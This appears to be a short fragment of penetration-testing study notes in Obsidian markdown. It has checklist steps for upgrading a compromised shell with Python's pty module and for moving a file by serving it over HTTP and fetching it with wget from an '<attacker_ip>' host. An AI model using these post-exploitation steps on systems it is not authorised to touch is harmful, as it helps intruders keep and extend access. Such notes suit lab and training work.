> - [ ] Upgrade shell: `python3 -c 'import pty; pty.spawn(...)'`

> [!checklist]+ File Transfer Setup
> - [ ] Prepare file: `echo 'Hello World' > file.txt`
> - [ ] Start HTTP server: `python3 -m http.server 8000`
> - [ ] Download file: `wget http://<attacker_ip>:8000/file.txt`


## üó∫Ô∏è Visual Overview

![[Pasted image 20250521091602.png]]